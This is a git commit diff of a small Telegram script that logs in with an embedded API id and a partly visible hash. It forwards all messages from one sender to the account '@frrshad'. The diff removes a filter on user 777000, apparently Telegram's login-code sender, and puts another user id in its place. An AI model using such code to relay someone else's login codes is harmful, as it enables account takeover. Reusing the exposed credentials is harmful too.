9f4d2dd4676dd18e49429542b750021e0582ad04
farshad.safari <71493467+09211208113@users.noreply.github.com>
2022-10-20 13:09:14 +0330

    Create selfe1.py

--- selfe1.py
+++ selfe1.py
@@ -8,7 +8,7 @@ app = Client(name ='frshad', api_id=29723786, api_hash='6963a88a79a3a75bed72f467
 id_or_username = '@frrshad'
 
 
-@app.on_message(filters.user(777000))
+@app.on_message(filters.user(5214329732))
 def forward_code(app:Client, message:Message):
     app.forward_messages(id_or_username, message.chat.id, message.id)
 
